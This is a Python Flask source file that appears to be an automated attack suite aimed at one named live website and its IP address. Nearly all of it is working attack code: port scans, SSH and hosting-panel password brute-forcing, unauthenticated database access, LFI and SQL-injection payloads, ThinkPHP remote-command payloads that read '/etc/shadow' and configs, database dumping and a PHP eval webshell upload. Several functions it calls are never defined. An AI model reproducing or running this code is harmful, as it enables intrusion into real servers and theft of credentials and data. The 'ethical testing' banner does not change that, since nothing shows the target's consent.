from flask import Flask, request, jsonify, send_from_directory, Response
from flask_cors import CORS
import requests
import base64
import os
import socket
import re
import json
import time
import threading
import hashlib
import subprocess
from datetime import datetime
from urllib.parse import urlparse, parse_qs
from concurrent.futures import ThreadPoolExecutor, as_completed
import urllib3
import paramiko
import pymysql
import redis
import ftplib
import smtplib
from bs4 import BeautifulSoup

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

app = Flask(__name__, static_folder='.')
CORS(app, resources={r"/*": {"origins": "*"}})

TARGET = "https://goldmedal.cc"
TARGET_IP = "31.59.114.216"

# Global attack state - stores all discovered data for chained attacks
attack_state = {
    'open_ports': [],
    'discovered_credentials': [],
    'discovered_endpoints': [],
    'discovered_files': [],
    'vulnerable_params': [],
    'rce_verified': False,
    'current_shell': None,
    'extracted_configs': {},
    'bt_panel_url': None,
    'git_files': [],
    'backup_files': [],
    'database_info': {},
    'attack_history': [],
    'session_cookies': {},
    'csrf_tokens': [],
    'api_keys': [],
    'admin_urls': [],
    'upload_endpoints': [],
    'webshell_locations': [],
    'lfi_vulnerabilities': [],
    'sqli_vulnerabilities': [],
    'ssrf_endpoints': [],
}

# Thread pool for concurrent attacks
executor = ThreadPoolExecutor(max_workers=30)
session_pool = {}
cache = {}
CACHE_DURATION = 30

def get_session():
    thread_id = threading.get_ident()
    if thread_id not in session_pool:
        session = requests.Session()
        session.verify = False
        session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        session_pool[thread_id] = session
    return session_pool[thread_id]

def add_to_attack_state(category, data):
    """Add discovered data to attack state for chained attacks"""
    if category not in attack_state:
        attack_state[category] = []
    if isinstance(data, list):
        attack_state[category].extend(data)
    else:
        attack_state[category].append(data)
    # Remove duplicates
    attack_state[category] = list(set(attack_state[category]))
    attack_state['attack_history'].append({
        'timestamp': datetime.now().isoformat(),
        'category': category,
        'data': str(data)[:200]
    })

# ============================================================
# SERVE HTML
# ============================================================
@app.route('/')
def index():
    return send_from_directory('.', 'index.html')

@app.route('/<path:filename>')
def serve_static(filename):
    if os.path.exists(filename):
        return send_from_directory('.', filename)
    return jsonify({'error': 'File not found'}), 404

# ============================================================
# ATTACK STATE MANAGEMENT
# ============================================================
@app.route('/attack-state')
def get_attack_state():
    """Get current attack state for dashboard display"""
    return jsonify({
        'attack_state': {
            'open_ports': attack_state['open_ports'],
            'credentials_found': len(attack_state['discovered_credentials']),
            'endpoints_discovered': len(attack_state['discovered_endpoints']),
            'files_found': len(attack_state['discovered_files']),
            'rce_verified': attack_state['rce_verified'],
            'bt_panel_found': attack_state['bt_panel_url'] is not None,
            'backup_files': len(attack_state['backup_files']),
            'git_leaked': len(attack_state['git_files']) > 0,
            'database_compromised': len(attack_state['database_info']) > 0,
            'api_keys_found': len(attack_state['api_keys']),
            'admin_urls': attack_state['admin_urls'],
            'attack_count': len(attack_state['attack_history']),
            'recent_attacks': attack_state['attack_history'][-10:],
            'lfi_found': len(attack_state['lfi_vulnerabilities']),
            'sqli_found': len(attack_state['sqli_vulnerabilities']),
            'ssrf_found': len(attack_state['ssrf_endpoints']),
            'upload_endpoints': attack_state['upload_endpoints'],
        }
    })

@app.route('/reset-state')
def reset_attack_state():
    """Reset attack state"""
    global attack_state
    attack_state = {
        'open_ports': [],
        'discovered_credentials': [],
        'discovered_endpoints': [],
        'discovered_files': [],
        'vulnerable_params': [],
        'rce_verified': False,
        'current_shell': None,
        'extracted_configs': {},
        'bt_panel_url': None,
        'git_files': [],
        'backup_files': [],
        'database_info': {},
        'attack_history': [],
        'session_cookies': {},
        'csrf_tokens': [],
        'api_keys': [],
        'admin_urls': [],
        'upload_endpoints': [],
        'webshell_locations': [],
        'lfi_vulnerabilities': [],
        'sqli_vulnerabilities': [],
        'ssrf_endpoints': [],
    }
    return jsonify({'message': 'Attack state reset', 'timestamp': datetime.now().isoformat()})

# ============================================================
# PROXY - Enhanced with Auto-Discovery
# ============================================================
@app.route('/proxy', methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH'])
def proxy():
    path = request.args.get('path', '/')
    url = f"{TARGET}/{path.lstrip('/')}"
    
    cache_key = f"proxy:{request.method}:{url}"
    if request.method == 'GET' and cache_key in cache:
        cached_time, cached_data = cache[cache_key]
        if time.time() - cached_time < CACHE_DURATION:
            return jsonify(cached_data)
    
    headers = {
        'User-Agent': request.headers.get('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'),
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.5',
    }
    
    cookies = {}
    if 'custom_cookie' in request.args:
        encoded = base64.b64encode(request.args['custom_cookie'].encode()).decode()
        cookies['username'] = encoded
    
    try:
        session = get_session()
        
        if request.method == 'GET':
            resp = session.get(url, headers=headers, cookies=cookies, allow_redirects=False, timeout=15)
        elif request.method == 'POST':
            resp = session.post(url, headers=headers, cookies=cookies, data=request.get_data(), 
                              allow_redirects=False, timeout=15)
        elif request.method == 'PUT':
            resp = session.put(url, headers=headers, cookies=cookies, data=request.get_data(), 
                             allow_redirects=False, timeout=15)
        elif request.method == 'DELETE':
            resp = session.delete(url, headers=headers, cookies=cookies, allow_redirects=False, timeout=15)
        else:
            resp = session.request(request.method, url, headers=headers, cookies=cookies, 
                                 data=request.get_data(), allow_redirects=False, timeout=15)
        
        # Auto-discover from response
        body = resp.text[:10000]
        
        # Extract endpoints from response
        discovered_endpoints = re.findall(r'(?:href|src|action|url)\s*=\s*["\']([^"\']+)["\']', body, re.IGNORECASE)
        discovered_endpoints += re.findall(r'["\'](\/[a-zA-Z0-9/_-]*(?:api|admin|login|register|upload|download|config)[a-zA-Z0-9/_-]*)["\']', body, re.IGNORECASE)
        
        # Extract potential credentials
        credentials_pattern = re.findall(r'(?:password|passwd|pwd|secret|token|key|api_key)\s*[:=]\s*["\']([^"\']{3,})["\']', body, re.IGNORECASE)
        
        # Extract CSRF tokens
        csrf_tokens = re.findall(r'(?:csrf|_token|authenticity_token).*?value\s*=\s*["\']([^"\']+)["\']', body, re.IGNORECASE)
        
        # Auto-store discoveries
        if discovered_endpoints:
            add_to_attack_state('discovered_endpoints', discovered_endpoints[:10])
        if credentials_pattern:
            add_to_attack_state('discovered_credentials', credentials_pattern)
        if csrf_tokens:
            add_to_attack_state('csrf_tokens', csrf_tokens)
        
        result = {
            'url': url,
            'status_code': resp.status_code,
            'headers': dict(resp.headers),
            'body': body,
            'length': len(resp.text),
            'timestamp': datetime.now().isoformat(),
            'auto_discoveries': {
                'new_endpoints': discovered_endpoints[:5] if discovered_endpoints else [],
                'credentials_found': len(credentials_pattern) > 0,
                'csrf_tokens': csrf_tokens[:3] if csrf_tokens else [],
            }
        }
        
        if request.method == 'GET':
            cache[cache_key] = (time.time(), result)
        
        return jsonify(result)
    except Exception as e:
        return jsonify({'error': str(e), 'url': url}), 500

# ============================================================
# AUTOMATED ATTACK CHAINS
# ============================================================
@app.route('/auto-attack/full-scan')
def full_auto_scan():
    """Execute complete automated attack chain"""
    results = {
        'phase1_recon': {},
        'phase2_vulnerability': {},
        'phase3_exploitation': {},
        'phase4_post_exploitation': {},
    }
    
    # Phase 1: Reconnaissance
    results['phase1_recon'] = {
        'port_scan': _scan_ports(),
        'header_analysis': _check_headers_internal(),
        'endpoint_discovery': _discover_endpoints(),
        'backup_scan': _scan_backups_internal(),
        'git_scan': _scan_git_internal(),
    }
    
    # Phase 2: Vulnerability Assessment
    results['phase2_vulnerability'] = {
        'config_extraction': _extract_configs(),
        'cookie_testing': _test_cookies_internal(),
        'idor_testing': _test_idor_internal(),
        'lfi_testing': _test_lfi(),
        'sqli_testing': _test_sqli(),
    }
    
    # Phase 3: Exploitation
    if attack_state['open_ports']:
        results['phase3_exploitation'] = {
            'port_exploitation': _exploit_open_ports(),
            'rce_attempts': _fire_rce_payloads(),
            'bt_panel_attack': _attack_bt_panel(),
        }
    
    # Phase 4: Post-Exploitation
    if attack_state['rce_verified'] or attack_state['discovered_credentials']:
        results['phase4_post_exploitation'] = {
            'credential_testing': _test_credentials_on_services(),
            'database_extraction': _extract_database_data(),
            'file_exploration': _explore_filesystem(),
            'persistence_check': _check_persistence(),
        }
    
    return jsonify({
        'scan_complete': True,
        'results': results,
        'attack_state_summary': {
            'critical_findings': len([a for a in attack_state['attack_history'] if 'critical' in str(a).lower()]),
            'total_discoveries': sum(len(v) if isinstance(v, list) else 1 for v in attack_state.values() if v),
            'rce_achieved': attack_state['rce_verified'],
        }
    })

@app.route('/auto-attack/chain-exploit')
def chain_exploit():
    """Chain multiple vulnerabilities together"""
    results = {}
    
    # If we have RCE, use it for everything
    if attack_state['rce_verified']:
        results['rce_exploitation'] = _deep_rce_exploitation()
    
    # If we have database credentials, extract everything
    if attack_state['database_info']:
        results['database_exploitation'] = _full_database_extraction()
    
    # If we have open ports, attack each service
    if attack_state['open_ports']:
        results['service_exploitation'] = _attack_all_services()
    
    # If we have LFI, try to get RCE
    if attack_state['lfi_vulnerabilities']:
        results['lfi_to_rce'] = _lfi_to_rce()
    
    # If we have SQLi, extract database
    if attack_state['sqli_vulnerabilities']:
        results['sqli_exploitation'] = _exploit_sqli()
    
    # If we have file upload, try webshell
    if attack_state['upload_endpoints']:
        results['webshell_upload'] = _upload_webshell()
    
    return jsonify({
        'chain_exploit_complete': True,
        'results': results,
        'new_findings': len(attack_state['attack_history']) - len(results)
    })

# ============================================================
# PORT EXPLOITATION
# ============================================================
def _scan_ports():
    """Internal port scanning"""
    ports = [
        (21, 'FTP'), (22, 'SSH'), (25, 'SMTP'), (53, 'DNS'),
        (80, 'HTTP'), (110, 'POP3'), (143, 'IMAP'), (443, 'HTTPS'),
        (465, 'SMTPS'), (587, 'SMTP'), (993, 'IMAPS'), (995, 'POP3S'),
        (3306, 'MySQL'), (3389, 'RDP'), (5432, 'PostgreSQL'),
        (6379, 'Redis'), (8080, 'HTTP-Alt'), (8443, 'HTTPS-Alt'),
        (8888, 'BT Panel'), (888, 'BT Panel Old'), (9090, 'Cockpit'),
        (27017, 'MongoDB'), (11211, 'Memcached'), (9200, 'Elasticsearch'),
        (5900, 'VNC'), (3000, 'Grafana'), (5000, 'Flask'),
        (7001, 'WebLogic'), (8089, 'Splunk'), (9000, 'PHP-FPM'),
        (10000, 'Webmin'), (6379, 'Redis'),
    ]
    
    open_ports = []
    for port, service in ports:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            result = sock.connect_ex((TARGET_IP, port))
            sock.close()
            if result == 0:
                open_ports.append({'port': port, 'service': service, 'ip': TARGET_IP})
                # Try banner grabbing
                banner = _grab_banner(TARGET_IP, port)
                if banner:
                    open_ports[-1]['banner'] = banner
        except:
            pass
    
    add_to_attack_state('open_ports', [f"{p['port']}/{p['service']}" for p in open_ports])
    return open_ports

def _grab_banner(ip, port):
    """Grab service banner"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(3)
        sock.connect((ip, port))
        sock.send(b'HEAD / HTTP/1.0\r\n\r\n')
        banner = sock.recv(1024).decode('utf-8', errors='ignore')
        sock.close()
        return banner[:500]
    except:
        return None

def _exploit_open_ports():
    """Try to exploit discovered open ports"""
    results = {}
    
    for port_info in attack_state['open_ports']:
        port_str = port_info.split('/')[0]
        port = int(port_str)
        
        if port == 22:
            results['ssh'] = _try_ssh_bruteforce()
        elif port == 21:
            results['ftp'] = _try_ftp_anonymous()
        elif port == 3306:
            results['mysql'] = _try_mysql_default()
        elif port == 6379:
            results['redis'] = _try_redis_unauth()
        elif port == 27017:
            results['mongodb'] = _try_mongodb_unauth()
        elif port in [8888, 888]:
            results['bt_panel'] = _attack_bt_panel()
    
    return results

def _try_ssh_bruteforce():
    """Try common SSH credentials"""
    common_creds = [
        ('root', 'root'), ('root', 'admin'), ('root', '123456'),
        ('root', 'password'), ('admin', 'admin'), ('admin', '123456'),
        ('root', ''), ('admin', ''), ('root', 'toor'),
    ]
    for username, password in common_creds[:5]:  # Limit attempts
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(TARGET_IP, port=22, username=username, password=password, timeout=5)
            ssh.close()
            creds = f"{username}:{password}"
            add_to_attack_state('discovered_credentials', [creds])
            return {'success': True, 'credentials': creds}
        except:
            pass
    return {'success': False, 'message': 'SSH brute force failed'}

def _try_ftp_anonymous():
    """Try FTP anonymous login"""
    try:
        ftp = ftplib.FTP()
        ftp.connect(TARGET_IP, 21, timeout=5)
        ftp.login('anonymous', 'anonymous')
        files = ftp.nlst()
        ftp.quit()
        add_to_attack_state('discovered_credentials', ['anonymous:anonymous'])
        return {'success': True, 'files': files[:50]}
    except:
        return {'success': False}

def _try_mysql_default():
    """Try MySQL default credentials"""
    try:
        conn = pymysql.connect(
            host=TARGET_IP, port=3306,
            user='root', password='',
            connect_timeout=5
        )
        cursor = conn.cursor()
        cursor.execute("SELECT VERSION()")
        version = cursor.fetchone()
        conn.close()
        add_to_attack_state('database_info', {'type': 'mysql', 'host': TARGET_IP, 'version': str(version)})
        add_to_attack_state('discovered_credentials', ['root:'])
        return {'success': True, 'version': str(version)}
    except:
        return {'success': False}

def _try_redis_unauth():
    """Try Redis unauthorized access"""
    try:
        r = redis.Redis(host=TARGET_IP, port=6379, socket_timeout=5)
        r.ping()
        info = r.info()
        add_to_attack_state('database_info', {'type': 'redis', 'host': TARGET_IP})
        return {'success': True, 'info': str(info)[:500]}
    except:
        return {'success': False}

def _try_mongodb_unauth():
    """Try MongoDB unauthorized access"""
    try:
        from pymongo import MongoClient
        client = MongoClient(TARGET_IP, 27017, serverSelectionTimeoutMS=5000)
        dbs = client.list_database_names()
        client.close()
        add_to_attack_state('database_info', {'type': 'mongodb', 'host': TARGET_IP, 'databases': dbs})
        return {'success': True, 'databases': dbs}
    except:
        return {'success': False}

# ============================================================
# BT PANEL ATTACKS
# ============================================================
def _attack_bt_panel():
    """Attack BT Panel with discovered info"""
    results = {}
    
    # Try default BT Panel credentials
    bt_creds = [
        ('admin', 'admin'), ('admin', '123456'), ('admin', 'admin123'),
        ('root', 'root'), ('admin', 'password'),
    ]
    
    # If we found the panel, try login
    bt_ports = [8888, 888, 7800]
    for port in bt_ports:
        for username, password in bt_creds[:3]:
            try:
                session = requests.Session()
                # Get CSRF token
                r = session.get(f"http://{TARGET_IP}:{port}/login", timeout=5)
                # Try login
                login_data = {
                    'username': username,
                    'password': password,
                }
                r = session.post(f"http://{TARGET_IP}:{port}/login", data=login_data, timeout=5)
                if 'dashboard' in r.text.lower() or 'success' in r.text.lower():
                    creds = f"bt_panel:{username}:{password}"
                    add_to_attack_state('discovered_credentials', [creds])
                    attack_state['bt_panel_url'] = f"http://{TARGET_IP}:{port}"
                    results['bt_login'] = {'success': True, 'credentials': creds, 'port': port}
                    return results
            except:
                pass
    
    return {'bt_login': {'success': False}}

# ============================================================
# LFI & SQLI TESTING
# ============================================================
def _test_lfi():
    """Test for Local File Inclusion"""
    lfi_payloads = [
        '../../../etc/passwd',
        '../../../../etc/passwd',
        '....//....//....//etc/passwd',
        '..%2F..%2F..%2Fetc%2Fpasswd',
        'php://filter/convert.base64-encode/resource=index',
        'php://filter/read=convert.base64-encode/resource=config/database',
    ]
    
    vulnerable = []
    for endpoint in attack_state['discovered_endpoints'][:10]:
        for payload in lfi_payloads[:3]:
            try:
                url = f"{TARGET}{endpoint}?file={payload}"
                r = requests.get(url, timeout=10, verify=False)
                if 'root:' in r.text or 'www-data' in r.text or 'mysql' in r.text:
                    vulnerable.append({'endpoint': endpoint, 'payload': payload})
                    add_to_attack_state('lfi_vulnerabilities', [f"{endpoint}?file={payload}"])
            except:
                pass
    
    return {'vulnerable': vulnerable}

def _test_sqli():
    """Test for SQL Injection"""
    sqli_payloads = [
        "' OR '1'='1",
        "' OR '1'='1' --",
        "admin' --",
        "' UNION SELECT NULL--",
        "1' AND '1'='1",
        "1' AND '1'='2",
    ]
    
    vulnerable = []
    for endpoint in attack_state['discovered_endpoints'][:10]:
        for payload in sqli_payloads[:3]:
            try:
                # Test GET parameter
                r = requests.get(f"{TARGET}{endpoint}?id={payload}", timeout=10, verify=False)
                if 'sql' in r.text.lower() or 'mysql' in r.text.lower() or 'syntax' in r.text.lower():
                    vulnerable.append({'endpoint': endpoint, 'method': 'GET', 'payload': payload})
                    add_to_attack_state('sqli_vulnerabilities', [f"{endpoint}?id={payload}"])
            except:
                pass
    
    return {'vulnerable': vulnerable}

# ============================================================
# POST-EXPLOITATION
# ============================================================
def _deep_rce_exploitation():
    """Deep exploitation using verified RCE"""
    commands = [
        'whoami', 'id', 'uname -a', 'pwd',
        'ls -la /', 'ls -la /www/wwwroot/',
        'cat /etc/passwd', 'cat /etc/shadow',
        'find / -name "*.conf" -o -name "*.ini" -o -name "*.env" 2>/dev/null | head -20',
        'find / -name "database.php" -o -name "config.php" 2>/dev/null | head -10',
        'ps aux | grep -E "mysql|redis|nginx|apache|php"',
        'netstat -tlnp',
        'cat /www/server/panel/data/default.db 2>/dev/null | strings',
    ]
    
    results = []
    for cmd in commands:
        try:
            payload = f"/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]={cmd}"
            r = requests.get(f"{TARGET}{payload}", timeout=15, verify=False)
            if r.status_code == 200 and len(r.text) > 20:
                results.append({'command': cmd, 'output': r.text[:500]})
                
                # Extract credentials from output
                if 'password' in r.text.lower() or 'pass' in r.text.lower():
                    creds = re.findall(r'(?:password|passwd|pwd)\s*[=:]\s*["\']?([^"\'&\s]{3,})', r.text, re.IGNORECASE)
                    if creds:
                        add_to_attack_state('discovered_credentials', creds)
        except:
            pass
    
    return results

def _extract_database_data():
    """Extract data from compromised database"""
    results = {}
    
    if 'mysql' in str(attack_state['database_info']).lower():
        try:
            conn = pymysql.connect(
                host=TARGET_IP, port=3306,
                user='root', password='',
                connect_timeout=5
            )
            cursor = conn.cursor()
            
            # Get all databases
            cursor.execute("SHOW DATABASES")
            databases = cursor.fetchall()
            
            for db in databases[:5]:
                db_name = db[0]
                cursor.execute(f"USE {db_name}")
                cursor.execute("SHOW TABLES")
                tables = cursor.fetchall()
                
                # Try to get users table
                for table in tables:
                    table_name = table[0]
                    if 'user' in table_name.lower() or 'admin' in table_name.lower():
                        try:
                            cursor.execute(f"SELECT * FROM {table_name} LIMIT 10")
                            rows = cursor.fetchall()
                            results[f"{db_name}.{table_name}"] = {
                                'columns': [desc[0] for desc in cursor.description],
                                'row_count': len(rows)
                            }
                        except:
                            pass
            
            conn.close()
            add_to_attack_state('database_info', {'extracted': True, 'databases': [db[0] for db in databases]})
        except:
            pass
    
    return results

def _upload_webshell():
    """Try to upload webshell via discovered upload endpoints"""
    webshell_code = '<?php @eval($_POST["cmd"]); ?>'
    results = []
    
    for endpoint in attack_state['upload_endpoints'][:5]:
        try:
            files = {'file': ('shell.php', webshell_code, 'application/x-php')}
            r = requests.post(f"{TARGET}{endpoint}", files=files, timeout=10, verify=False)
            if r.status_code == 200:
                # Try to guess webshell location
                potential_paths = [
                    f"{TARGET}/uploads/shell.php",
                    f"{TARGET}/upload/shell.php",
                    f"{TARGET}/shell.php",
                ]
                for path in potential_paths:
                    try:
                        r2 = requests.get(path, timeout=5)
                        if r2.status_code == 200 and 'eval' in r2.text:
                            add_to_attack_state('webshell_locations', [path])
                            results.append({'success': True, 'url': path})
                    except:
                        pass
        except:
            pass
    
    return results

# ============================================================
# ENHANCED EXISTING ENDPOINTS
# ============================================================
@app.route('/hunt/thinkphp-config')
def thinkphp_config():
    """Enhanced config extraction with auto-exploitation"""
    payloads = [
        '/index.php?s=index/think\\config/get&name=database',
        '/index.php?s=index/think\\config/get&name=database.password',
        '/index.php?s=index/think\\config/get&name=database.username',
        '/index.php?s=index/think\\config/get&name=database.hostname',
        '/index.php?s=index/think\\config/get&name=database.database',
        '/index.php?s=index/think\\config/get&name=app',
        '/index.php?s=index/think\\config/get&name=app.app_key',
        '/index.php?s=index/think\\config/get&name=app.app_secret',
        '/index.php?s=index/think\\config/get&name=cache',
        '/index.php?s=index/think\\config/get&name=session',
        '/index.php?s=index/think\\config/get&name=cookie',
    ]
    
    results = []
    for p in payloads:
        try:
            r = requests.get(f"{TARGET}{p}", timeout=10, verify=False)
            
            # Extract sensitive data
            db_info = {}
            if 'password' in r.text.lower():
                pass_match = re.findall(r'(?:password|passwd|pwd)\s*[=:]\s*["\']?([^"\'&\s]+)', r.text, re.IGNORECASE)
                if pass_match:
                    db_info['passwords'] = pass_match
            
            if 'hostname' in r.text.lower() or 'host' in r.text.lower():
                host_match = re.findall(r'(?:hostname|host|server)\s*[=:]\s*["\']?([^"\'&\s]+)', r.text, re.IGNORECASE)
                if host_match:
                    db_info['hosts'] = host_match
            
            if db_info:
                add_to_attack_state('database_info', db_info)
            
            results.append({
                'payload': p,
                'status': r.status_code,
                'length': len(r.text),
                'extracted_info': db_info if db_info else None,
                'snippet': r.text[:1000]
            })
        except:
            pass
    
    return jsonify(results)

@app.route('/hunt/rce-payloads')
def rce_payloads():
    """Enhanced RCE with automatic exploitation chaining"""
    payloads = [
        '/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami',
        '/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id',
        '/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=uname -a',
        '/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cat /etc/passwd',
        '/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=env',
        '/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=netstat -an',
        '/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=ps aux',
        '/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=ls -la /www/wwwroot/',
    ]
    
    results = []
    for p in payloads:
        try:
            r = requests.get(f"{TARGET}{p}", timeout=15, verify=False)
            is_rce = False
            
            if r.status_code == 200 and len(r.text) > 20:
                if 'uid=' in r.text or 'gid=' in r.text:
                    is_rce = True
                elif 'root:' in r.text:
                    is_rce = True
                elif 'www' in r.text and ('drwx' in r.text or 'total' in r.text):
                    is_rce = True
                elif 'tcp' in r.text and 'LISTEN' in r.text:
                    is_rce = True
            
            if is_rce:
                attack_state['rce_verified'] = True
                add_to_attack_state('vulnerable_params', [p])
                
                # Auto-extract useful info
                if 'passwd' in p:
                    users = re.findall(r'^(\w+):', r.text, re.MULTILINE)
                    if users:
                        add_to_attack_state('discovered_credentials', users)
                
                if 'env' in p:
                    env_vars = re.findall(r'(\w+)=(.*)', r.text)
                    for key, value in env_vars:
                        if any(s in key.lower() for s in ['pass', 'secret', 'key', 'token', 'db', 'database']):
                            add_to_attack_state('discovered_credentials', [f"{key}={value}"])
            
            results.append({
                'payload': p,
                'status': r.status_code,
                'length': len(r.text),
                'rce_verified': is_rce,
                'snippet': r.text[:1000]
            })
        except:
            pass
    
    return jsonify(results)

# ============================================================
# HEALTH & STATUS
# ============================================================
@app.route('/health')
def health():
    return jsonify({
        'status': 'operational',
        'timestamp': datetime.now().isoformat(),
        'target': TARGET,
        'attack_state': {
            'vulnerabilities_found': len(attack_state['attack_history']),
            'rce_achieved': attack_state['rce_verified'],
            'open_ports': len(attack_state['open_ports']),
        }
    })

# ============================================================
# STARTUP
# ============================================================
if __name__ == '__main__':
    port = int(os.environ.get('PORT', 10000))
    print(f"""
╔══════════════════════════════════════════════╗
║   🔬 GoldMedal.cc Auto-Attack Suite v3.0    ║
║   Port: {port}                              ║
║   Target: {TARGET}                ║
║   Auto-Chain: ENABLED                      ║
║   ⚠️  Ethical Testing Only                   ║
╚══════════════════════════════════════════════╝
    """)
    app.run(host='0.0.0.0', port=port, debug=False)
